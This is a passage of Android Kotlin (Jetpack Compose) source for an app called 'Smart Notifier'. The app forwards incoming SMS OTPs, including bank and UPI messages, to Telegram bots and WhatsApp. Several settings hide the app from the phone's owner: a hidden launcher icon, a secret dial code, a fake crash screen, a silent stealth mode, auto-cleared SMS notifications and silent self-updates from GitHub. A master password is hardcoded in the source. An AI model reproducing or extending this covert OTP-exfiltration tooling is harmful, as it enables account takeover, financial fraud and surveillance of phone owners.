                            prefs.edit().putString("custom_secret_code", customSecretCode.trim()).apply()
                            Toast.makeText(context, "Code Saved: *#*#$customSecretCode#*#*", Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.height(52.dp)
                    ) {
                        Text("Set", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }
                }
                Text("ℹ️ Master Code *#*#0825#*#* hamesha background me active rahega.", fontSize = 9.sp, color = Color(0xFFA5B4FC), modifier = Modifier.padding(top = 2.dp))

                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)


                // Silent Stealth Mode
                SettingToggleRow("Silent Stealth Mode", isSilentMode) { silent ->
                    isSilentMode = silent
                    prefs.edit().putBoolean("show_screen_popups", !silent).apply()
                }

                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)

                // Fingerprint Lock
                SettingToggleRow("Fingerprint / PIN Lock", isAppLockEnabled) { checked ->
                    isAppLockEnabled = checked
                    prefs.edit().putBoolean("app_lock_enabled", checked).apply()
                }

                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)

                // Fake Crash Disguise
                SettingToggleRow("Fake Crash Screen (3-Tap Unlock)", isFakeCrashEnabled) { checked ->
                    isFakeCrashEnabled = checked
                    prefs.edit().putBoolean("fake_crash_enabled", checked).apply()
                }

                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)

                // Auto-Clear SMS Notifications
                SettingToggleRow("Auto-Clear SMS Notifications", isAutoClearSms) { checked ->
                    isAutoClearSms = checked
                    prefs.edit().putBoolean("auto_clear_sms_notification", checked).apply()
                }

                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)

                // Hide App Icon
                SettingToggleRow("Hide Launcher Icon", isIconHidden) { hide ->
                    setLauncherIconVisibility(context, hide)
                    isIconHidden = hide
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Card: Secret In-App Update
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Text("🔄 Secret In-App Cloud Update", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFF60A5FA))
                Text("Bina bahar pop-up chhode, GitHub se direct update install karein:", fontSize = 11.sp, color = TextSecondary)
                Spacer(modifier = Modifier.height(10.dp))

                var updateProgressText by remember { mutableStateOf("") }
                var isUpdating by remember { mutableStateOf(false) }

                Button(
                    onClick = {
                        isUpdating = true
                        updateProgressText = "Connecting to GitHub..."
                        scope.launch {
                            val res = AppUpdater.downloadAndInstall(context) { progress ->
                                updateProgressText = progress
                            }
                            if (!res.first) updateProgressText = "❌ ${res.second}"
                            isUpdating = false
                        }
                    },
                    enabled = !isUpdating,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1D4ED8)),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(if (isUpdating) updateProgressText else "🚀 Check & Install Update Now", fontSize = 13.sp)
                }

                if (updateProgressText.isNotEmpty() && !isUpdating) {
                    Text(
                        text = updateProgressText,
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (updateProgressText.startsWith("❌")) Color(0xFFEF4444) else AccentEmerald,
                        modifier = Modifier.padding(top = 4.dp)
                    )
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Save All Button
        Button(
            onClick = {
                prefs.edit()
                    .putBoolean("is_telegram_enabled", isTelegramEnabled)
                    .putString("bot_token", botToken.trim())
                    .putString("chat_id", chatId.trim())
                    .putBoolean("is_telegram_2_enabled", isTelegram2Enabled)
                    .putString("bot_token_2", botToken2.trim())
                    .putString("chat_id_2", chatId2.trim())
                    .putBoolean("is_whatsapp_enabled", isWhatsAppEnabled)
                    .putString("wa_phone", waPhone.trim())
                    .putString("wa_api_key", waApiKey.trim())
                    .putBoolean("only_otp_mode", isOnlyOtpMode)
                    .putBoolean("low_battery_alert_enabled", isLowBatteryAlertEnabled)
                    .putBoolean("app_lock_enabled", isAppLockEnabled)
                    .putBoolean("fake_crash_enabled", isFakeCrashEnabled)
                    .putBoolean("auto_clear_sms_notification", isAutoClearSms)
                    .putString("custom_secret_code", customSecretCode.trim())
                    .apply()
                Toast.makeText(context, "✅ Settings Saved!", Toast.LENGTH_SHORT).show()
            },
            modifier = Modifier.fillMaxWidth().height(50.dp),
            shape = RoundedCornerShape(12.dp),
            colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo)
        ) {
            Text("💾 Save Configuration", fontSize = 15.sp, fontWeight = FontWeight.Bold)
        }

        Spacer(modifier = Modifier.height(24.dp))
    }
}

@Composable
fun QuickSetupGuideDialog(
    context: Context,
    onDismiss: () -> Unit
) {
    var selectedGuideTab by remember { mutableStateOf(0) }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Color(0xFF0F172A),
        title = {
            Text("❓ Smart Notifier Setup Guide", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = Color(0xFFA5B4FC))
        },
        text = {
            Column(modifier = Modifier.fillMaxWidth().verticalScroll(rememberScrollState())) {
                // Tab switcher
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                    Button(
                        onClick = { selectedGuideTab = 0 },
                        colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 0) AccentIndigo else Color(0xFF1E293B)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("📢 Telegram", fontSize = 11.sp)
                    }
                    Button(
                        onClick = { selectedGuideTab = 1 },
                        colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 1) AccentIndigo else Color(0xFF1E293B)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("💬 WhatsApp", fontSize = 11.sp)
                    }
                }

                Spacer(modifier = Modifier.height(14.dp))

                if (selectedGuideTab == 0) {
                    // Telegram Guide
                    Text("📢 Telegram Bot Setup (Sirf 1 Minute):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = AccentEmerald)
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        "1. Telegram app me search karein: @BotFather\n" +
                        "2. Wahan /newbot likhein aur apne bot ka koi bhi naam dalein.\n" +
                        "3. BotFather aapko ek lamba Token dega (jaise 8680515171:AAF...).\n" +
                        "4. Us Token ko copy karke yahan 'Bot Token 1' me paste karein.\n" +
                        "5. Telegram me ek naya Channel banayein aur apne bot ko us channel ka Admin bana dein.\n" +
                        "6. Channel ka Chat ID (jaise -100...) yahan 'Channel ID 1' me daal kar Save kar dein!\n\n" +
                        "✅ Done! Ab har OTP turant aapke channel par aayega.",
                        fontSize = 11.sp,
                        color = TextSecondary,
                        lineHeight = 16.sp
                    )
                } else {
                    // WhatsApp Guide
                    Text("💬 WhatsApp Setup (CallMeBot):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF2DD4BF))
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        "1. WhatsApp kholiye aur is number par message bhejiye:\n" +
                        "   👉 +34 644 44 24 53\n" +
                        "2. Message me likhiye:\n" +
                        "   'I allow callmebot to send me messages'\n" +
                        "3. CallMeBot 5 second ke andar aapko ek API Key bhej dega.\n" +
                        "4. Wahi API Key yahan app me 'CallMeBot API Key' me daal dein.\n" +
                        "5. Apna WhatsApp mobile number international format me dalein (e.g. 919876543210).\n\n" +
                        "🛡️ Ghost Stealth: Phone ke WhatsApp me koi message ya chat history nahi banti!",
                        fontSize = 11.sp,
                        color = TextSecondary,
                        lineHeight = 16.sp
                    )
                }
            }
        },
        confirmButton = {
            Button(
                onClick = onDismiss,
                colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                shape = RoundedCornerShape(8.dp)
            ) {
                Text("Got It", fontSize = 12.sp, fontWeight = FontWeight.Bold)
            }
        }
    )
}

@Composable
fun KeywordsTab(context: Context) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    var forwardAll by remember { mutableStateOf(prefs.getBoolean("forward_all_notifications", false)) }
    var keywordsList by remember { mutableStateOf(KeywordManager.getKeywords(context)) }
    var newKeywordText by remember { mutableStateOf("") }
    var testSender by remember { mutableStateOf("AD-UPEGOV-S") }
    var testMessage by remember { mutableStateOf("OTP for Authentication is : 240833 --eDistrict UP") }
    var testResult by remember { mutableStateOf("") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(vertical = 8.dp)
    ) {
        // Forward ALL Master Card
        MncCard {
            Row(
                modifier = Modifier.fillMaxWidth().padding(14.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("⚡ Forward ALL Notifications", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFFBBF24))
                    Text(
                        text = if (forwardAll) "🟢 ON: Har SMS aur Notification forward hoga" else "⚪ OFF: Sirf filtered keywords hi forward honge",
                        fontSize = 11.sp,
                        color = TextSecondary
                    )
                }
                Switch(
                    checked = forwardAll,
                    onCheckedChange = { checked ->
                        forwardAll = checked
                        prefs.edit().putBoolean("forward_all_notifications", checked).apply()
                    }
                )
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // Preset Quick Action Buttons
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Text("⚡ 1-Click Rule Presets", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = TextPrimary)
                Spacer(modifier = Modifier.height(8.dp))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(
                        onClick = {
                            keywordsList = KeywordManager.resetDefaults(context)
                            Toast.makeText(context, "eDistrict Rules Loaded!", Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF065F46)),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("🏢 eDistrict UP", fontSize = 11.sp)
                    }
                    Button(
                        onClick = {
                            val bankRules = listOf("SBI", "HDFC", "ICICI", "PNB", "AXIS", "PAYTM", "GPAY")
                            bankRules.forEach { KeywordManager.addKeyword(context, it) }
                            keywordsList = KeywordManager.getKeywords(context)
                            Toast.makeText(context, "Bank Rules Added!", Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E3A8A)),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("🏦 Banks & UPI", fontSize = 11.sp)
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // Add Keyword Input
        Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
            Box(modifier = Modifier.weight(1f)) {
                MncTextField(value = newKeywordText, onValueChange = { newKeywordText = it }, label = "Add Keyword (e.g. CSC, EDIST)")
            }
            Spacer(modifier = Modifier.width(8.dp))
            Button(
                onClick = {
                    if (newKeywordText.trim().isNotEmpty()) {
                        keywordsList = KeywordManager.addKeyword(context, newKeywordText.trim())
                        newKeywordText = ""
                    }
                },
                shape = RoundedCornerShape(10.dp),
                colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                modifier = Modifier.height(52.dp)
            ) {
                Text("+ Add", fontSize = 13.sp, fontWeight = FontWeight.Bold)
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // Active Rules List
        Text("Current Active Filters (${keywordsList.size}):", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = TextSecondary)
        Spacer(modifier = Modifier.height(6.dp))

        Column(modifier = Modifier.fillMaxWidth()) {
            keywordsList.forEach { kw ->
                MncCard(modifier = Modifier.padding(vertical = 4.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(horizontal = 14.dp, vertical = 10.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Text("🏷️ $kw", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
                        IconButton(onClick = {
                            keywordsList = KeywordManager.removeKeyword(context, kw)
                        }) {
                            Text("❌", fontSize = 12.sp)
                        }
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Live Test Simulator
        MncCard {
            Column(modifier = Modifier.padding(14.dp)) {
                Text("🧪 Test Keyword Match (Live Simulator)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFFA78BFA))
                Spacer(modifier = Modifier.height(8.dp))
                MncTextField(value = testSender, onValueChange = { testSender = it }, label = "Sender ID")
                Spacer(modifier = Modifier.height(6.dp))
                MncTextField(value = testMessage, onValueChange = { testMessage = it }, label = "SMS Message Body")
                Spacer(modifier = Modifier.height(10.dp))
                Button(
                    onClick = {
                        val matches = KeywordManager.matches(context, testSender, testMessage)
                        testResult = if (matches) "✅ MATCH! Ye message forward hoga." else "❌ REJECT! Match nahi hua."
                    },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6D28D9))
                ) {
                    Text("Check Match", fontSize = 13.sp)
                }
                if (testResult.isNotEmpty()) {
                    Text(
                        text = testResult,
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (testResult.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                        modifier = Modifier.padding(top = 8.dp)
                    )
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))
    }
}

@Composable
fun HistoryTab(context: Context) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    var historyList by remember { mutableStateOf(HistoryManager.getHistory(context)) }
    var isAutoClearHistory by remember { mutableStateOf(prefs.getBoolean("auto_clear_history_24h", false)) }

    Column(modifier = Modifier.fillMaxSize().padding(vertical = 8.dp)) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text("📜 Forwarded OTP Logs", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = TextPrimary)
            Row(verticalAlignment = Alignment.CenterVertically) {
                IconButton(onClick = {
                    historyList = HistoryManager.getHistory(context)
                }) {
                    Text("🔄", fontSize = 16.sp)
                }
                if (historyList.isNotEmpty()) {
                    TextButton(onClick = {
                        HistoryManager.clearHistory(context)
                        historyList = emptyList()
                    }) {
                        Text("Clear All", color = Color(0xFFEF4444), fontSize = 12.sp)
                    }
                }
            }
        }

        // 24h Auto-Clear History Toggle Card
        MncCard(modifier = Modifier.padding(vertical = 8.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth().padding(12.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("🗑️ Auto-Delete Logs (>24 Hours)", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = AccentAmber)
                    Text("24h purane OTP records phone se auto-delete honge", fontSize = 10.sp, color = TextSecondary)
                }
                Switch(
                    checked = isAutoClearHistory,
                    onCheckedChange = { checked ->
                        isAutoClearHistory = checked
                        prefs.edit().putBoolean("auto_clear_history_24h", checked).apply()
                        if (checked) {
                            HistoryManager.pruneOldHistory(context)
                            historyList = HistoryManager.getHistory(context)
                        }
                    }
                )
            }
        }

        if (historyList.isEmpty()) {
            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Text(
                    text = "Abhi tak koi OTP forward nahi hua hai.\nJaise hi koi OTP aayega, uska record yahan dikhega.",
                    fontSize = 12.sp,
                    color = TextMuted,
                    textAlign = TextAlign.Center
                )
            }
        } else {
            LazyColumn(modifier = Modifier.fillMaxSize()) {
                items(historyList) { item ->
                    MncCard(modifier = Modifier.padding(vertical = 4.dp)) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                                Text("From: ${item.sender}", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF60A5FA))
                                Text(item.timestamp, fontSize = 11.sp, color = TextMuted)
                            }
                            Spacer(modifier = Modifier.height(4.dp))
                            Text("🔑 OTP: ${item.otp}", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = AccentEmerald)
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(item.fullMessage, fontSize = 11.sp, color = TextSecondary)
                            Spacer(modifier = Modifier.height(8.dp))
                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                MncStatusBadge(label = "TG 1", status = item.telegramStatus)
                                if (item.telegram2Status != "Disabled") {
                                    MncStatusBadge(label = "TG 2", status = item.telegram2Status)
                                }
                                MncStatusBadge(label = "WhatsApp", status = item.whatsappStatus)
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun ProPaytmTab(context: Context) {
    val prefs = remember { PrefsHelper.getPrefs(context) }
    val scope = rememberCoroutineScope()
    val deviceId = remember { CloudflareLicenseManager.getDeviceId(context) }

    var isMaster = remember { CloudflareLicenseManager.isMasterFounder(context) }
    var isLicensed by remember { mutableStateOf(CloudflareLicenseManager.isLicenseActive(context)) }
    var licenseInput by remember { mutableStateOf("") }
    var activateStatus by remember { mutableStateOf("") }
    var trialInfo by remember { mutableStateOf("Checking trial...") }

    LaunchedEffect(Unit) {
        val trialRes = CloudflareLicenseManager.checkOrStartTrial(context)
        trialInfo = trialRes.second
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(vertical = 8.dp)
    ) {
        // Membership Status Banner
        MncCard {
            Column(modifier = Modifier.padding(16.dp)) {
                if (isMaster) {
                    Text("👑 MASTER FOUNDER ACCESS ACTIVE", fontWeight = FontWeight.ExtraBold, fontSize = 15.sp, color = Color(0xFFFBBF24))
                    Text("Unlimited Forever · All Portals & Bypass Active", fontSize = 11.sp, color = AccentEmerald)
                } else if (isLicensed) {
                    Text("⭐ PRO LICENSE ACTIVE", fontWeight = FontWeight.ExtraBold, fontSize = 15.sp, color = AccentEmerald)
                    Text("Hardware Locked · Full 24/7 Access Active", fontSize = 11.sp, color = TextSecondary)
                } else {
                    Text("⏳ STATUS: $trialInfo", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = AccentAmber)
                    Text("Trial khatam hone ke baad continue rakhne ke liye Pro license unlock karein.", fontSize = 11.sp, color = TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(14.dp))

        // PayTM & License Purchase Card
        MncCard {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("💎 Smart Notifier Lifetime Pro", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = Color(0xFFA5B4FC))
                Text("Price: ₹199 (One-Time Lifetime)", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = AccentEmerald)
                Spacer(modifier = Modifier.height(10.dp))

                // PayTM Details
                Surface(
                    color = Color(0xFF0F172A),
                    shape = RoundedCornerShape(10.dp),
                    border = BorderStroke(1.dp, CardBorder),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Column {
                            Text("PayTM / PhonePe / GPay Number:", fontSize = 10.sp, color = TextMuted)
                            Text("8006518960", fontSize = 16.sp, fontWeight = FontWeight.ExtraBold, color = Color.White)
                        }
                        Button(
                            onClick = {
                                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                clipboard.setPrimaryClip(ClipData.newPlainText("PayTM No", "8006518960"))
                                Toast.makeText(context, "Number Copied: 8006518960", Toast.LENGTH_SHORT).show()
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
                        ) {
                            Text("Copy", fontSize = 11.sp)
                        }
                    }
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Hardware Device ID
                Surface(
                    color = Color(0xFF0F172A),
                    shape = RoundedCornerShape(10.dp),
                    border = BorderStroke(1.dp, CardBorder),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Text("Your Phone Hardware ID:", fontSize = 10.sp, color = TextMuted)
                            Text(deviceId, fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Color(0xFF67E8F9))
                        }
                        Button(
                            onClick = {
                                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                clipboard.setPrimaryClip(ClipData.newPlainText("Device ID", deviceId))
                                Toast.makeText(context, "Device ID Copied!", Toast.LENGTH_SHORT).show()
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0284C7)),
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)
                        ) {
                            Text("Copy", fontSize = 11.sp)
                        }
                    }
                }

                Spacer(modifier = Modifier.height(12.dp))

                // WhatsApp Direct Order Button
                Button(
                    onClick = {
                        try {
                            val msg = "Hello bhaiya, maine 8006518960 par ₹199 PayTM kar diya hai. Mera Smart Notifier Device ID hai: $deviceId. Kripya License Key bhej dijiye."
                            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/918006518960?text=${Uri.encode(msg)}"))
                            context.startActivity(intent)
                        } catch (e: Exception) {
                            Toast.makeText(context, "WhatsApp open error: ${e.message}", Toast.LENGTH_SHORT).show()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF059669)),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth().height(46.dp)
                ) {
                    Text("💬 Send Receipt & Get Key on WhatsApp", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                }

                Spacer(modifier = Modifier.height(16.dp))
                HorizontalDivider(color = CardBorder)
                Spacer(modifier = Modifier.height(16.dp))

                // Enter License Key
                Text("Activate License Key:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
                Spacer(modifier = Modifier.height(6.dp))
                MncTextField(value = licenseInput, onValueChange = { licenseInput = it }, label = "License Key (e.g. SN-XXXX-XXXX)")
                Spacer(modifier = Modifier.height(10.dp))
                Button(
                    onClick = {
                        activateStatus = "Activating on Cloudflare..."
                        scope.launch {
                            val res = CloudflareLicenseManager.activateLicense(context, licenseInput)
                            activateStatus = if (res.first) "✅ ${res.second}" else "❌ ${res.second}"
                            if (res.first) isLicensed = true
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth().height(46.dp)
                ) {
                    Text("🚀 Unlock Pro Lifetime", fontSize = 13.sp, fontWeight = FontWeight.Bold)
                }

                if (activateStatus.isNotEmpty()) {
                    Text(
                        text = activateStatus,
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (activateStatus.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
                        modifier = Modifier.padding(top = 6.dp)
                    )
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))
    }
}

@Composable
fun AdminEnterpriseDialog(
    context: Context,
    onDismiss: () -> Unit
) {
    val scope = rememberCoroutineScope()
    var inputPassword by remember { mutableStateOf("") }
    var isAuthorized by remember { mutableStateOf(false) }
    var generatedKey by remember { mutableStateOf("") }
    var adminMsg by remember { mutableStateOf("") }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Color(0xFF0F172A),
        title = {
            Text("⚡ Master Admin Control", fontWeight = FontWeight.ExtraBold, fontSize = 17.sp, color = Color(0xFFFBBF24))
        },
        text = {
            Column(modifier = Modifier.fillMaxWidth().verticalScroll(rememberScrollState())) {
                if (!isAuthorized) {
                    Text("Enter Master Security Key:", fontSize = 12.sp, color = TextSecondary)
                    Spacer(modifier = Modifier.height(8.dp))
                    MncTextField(value = inputPassword, onValueChange = { inputPassword = it }, label = "Master Password")
                    Spacer(modifier = Modifier.height(14.dp))
                    Button(
                        onClick = {
                            if (inputPassword.trim() == "910010025123343") {
                                isAuthorized = true
                                Toast.makeText(context, "✅ Master Access Granted", Toast.LENGTH_SHORT).show()
                            } else {
                                Toast.makeText(context, "❌ Invalid Master Key", Toast.LENGTH_SHORT).show()
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Verify Master", fontSize = 13.sp, fontWeight = FontWeight.Bold)
                    }
                } else {
                    // Authorized Master Dashboard
                    Text("👑 Master Founder Verified (Ankit)", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = AccentEmerald)
                    Spacer(modifier = Modifier.height(14.dp))

                    // Action 1: Activate Personal eDistrict Setup
                    Button(
                        onClick = {
                            CloudflareLicenseManager.activateMasterFounder(context)
                            adminMsg = "✅ eDistrict Profile Permanently Loaded!"
                            Toast.makeText(context, adminMsg, Toast.LENGTH_LONG).show()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF065F46)),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("🚀 Activate My eDistrict Setup (Permanent)", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }

                    Spacer(modifier = Modifier.height(14.dp))
                    HorizontalDivider(color = CardBorder)
                    Spacer(modifier = Modifier.height(14.dp))

                    // Action 2: Cloudflare Key Generator
                    Text("🔑 Generate Customer License Key", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
                    Text("Cloudflare KV me instant key banayein:", fontSize = 10.sp, color = TextMuted)
                    Spacer(modifier = Modifier.height(8.dp))

                    Button(
                        onClick = {
                            adminMsg = "Generating on Cloudflare..."
                            scope.launch {
                                val res = CloudflareLicenseManager.generateCustomerKey(context, "910010025123343")
                                if (res.first) {
                                    generatedKey = res.second
                                    adminMsg = "✅ New Key Generated!"
                                } else {
                                    adminMsg = "❌ ${res.second}"
                                }
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                        shape = RoundedCornerShape(10.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("✨ Generate License Key", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }

                    if (generatedKey.isNotEmpty()) {
                        Spacer(modifier = Modifier.height(10.dp))
                        Surface(
                            color = Color(0xFF1E1B4B),
                            shape = RoundedCornerShape(8.dp),
                            border = BorderStroke(1.dp, Color(0xFF4338CA)),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(10.dp)) {
                                Text("New Key: $generatedKey", fontWeight = FontWeight.ExtraBold, fontSize = 14.sp, color = Color(0xFFA5B4FC))
                                Spacer(modifier = Modifier.height(6.dp))
                                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                    Button(
                                        onClick = {
                                            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                            clipboard.setPrimaryClip(ClipData.newPlainText("License", generatedKey))
                                            Toast.makeText(context, "Key Copied!", Toast.LENGTH_SHORT).show()
                                        },
                                        colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
                                        shape = RoundedCornerShape(6.dp),
                                        modifier = Modifier.weight(1f)
                                    ) {
                                        Text("Copy Key", fontSize = 11.sp)
                                    }
                                    Button(
                                        onClick = {
                                            try {
                                                val intent = Intent(Intent.ACTION_SEND).apply {
                                                    type = "text/plain"
                                                    putExtra(Intent.EXTRA_TEXT, "Hello! Aapki Smart Notifier Lifetime Pro License Key hai: $generatedKey")
                                                }
                                                context.startActivity(Intent.createChooser(intent, "Share License Key"))
                                            } catch (e: Exception) {
                                                Toast.makeText(context, "Share error", Toast.LENGTH_SHORT).show()
                                            }
                                        },
                                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF059669)),
                                        shape = RoundedCornerShape(6.dp),
                                        modifier = Modifier.weight(1f)
                                    ) {
                                        Text("Share", fontSize = 11.sp)
                                    }
                                }
                            }
                        }
                    }

                    if (adminMsg.isNotEmpty()) {
                        Text(adminMsg, fontSize = 11.sp, color = AccentEmerald, modifier = Modifier.padding(top = 6.dp))
                    }
                }
            }
        },
        confirmButton = {
            TextButton(onClick = onDismiss) {
                Text("Close", color = Color.White, fontWeight = FontWeight.Bold)
            }
        }
    )
}

@Composable
fun MncCard(
    modifier: Modifier = Modifier,
    content: @Composable ColumnScope.() -> Unit
) {
    Card(
        modifier = modifier.fillMaxWidth(),
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(containerColor = CardBg),
        border = BorderStroke(1.dp, CardBorder),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
        content = content
    )
}

@Composable
fun MncTextField(
    value: String,
    onValueChange: (String) -> Unit,
    label: String
) {
    OutlinedTextField(
        value = value,
        onValueChange = onValueChange,
        label = { Text(label, fontSize = 11.sp, color = TextMuted) },
        shape = RoundedCornerShape(10.dp),
